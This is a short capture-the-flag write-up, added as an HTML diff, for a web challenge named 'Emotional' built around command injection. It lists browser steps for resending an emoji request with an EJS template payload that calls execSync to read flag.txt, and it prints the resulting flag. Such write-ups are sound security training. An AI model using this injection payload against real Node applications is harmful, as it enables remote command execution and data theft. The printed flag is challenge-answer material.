@@ -1,0 +1,43 @@
+<h1 id="-emotional">🌐 Emotional</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>🌐 Web</td>
+      <td>John Hammond</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>Don’t be shy, show your emotions! Get emotional if you have to! Uncover the flag.</p>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>Web command injection</li>
+</ul>
+
+<h2 id="solve">Solve</h2>
+<p>Press F12</p>
+
+<p>Run an emoji change</p>
+
+<p>Right click to edit and resend</p>
+
+<p><code class="language-plaintext highlighter-rouge">Emoji=&lt;%= process.mainModule.require('child_process').execSync('cat flag.txt').toString() %&gt;</code></p>
+
+<p>F5 to refresh</p>
+
+<p>Check the response panel for flag</p>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">flag{8c8e0e59d1292298b64c625b401e8cfa}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
